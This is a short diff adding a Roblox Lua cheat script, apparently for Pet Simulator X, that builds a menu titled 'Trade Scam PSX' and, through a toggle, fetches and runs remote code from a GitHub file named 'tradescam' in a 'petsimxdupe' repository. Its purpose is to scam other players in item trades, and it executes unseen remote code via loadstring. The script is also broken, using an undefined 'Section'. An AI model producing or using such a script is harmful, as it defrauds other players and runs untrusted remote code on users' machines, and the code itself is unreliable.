@@ -1,0 +1,12 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Trade Scam PSX", "Ocean")
+
+local Tab = Window:NewTab("Trade Scam")
+
+Section:NewToggle("Trade Scam ✔️/❌", "Trade Scams", function(state)
+    if state then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/VeinKiller/petsimxdupe/main/tradescam"))()
+    else
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/VeinKiller/petsimxdupe/main/tradescam"))()
+    end
+end)
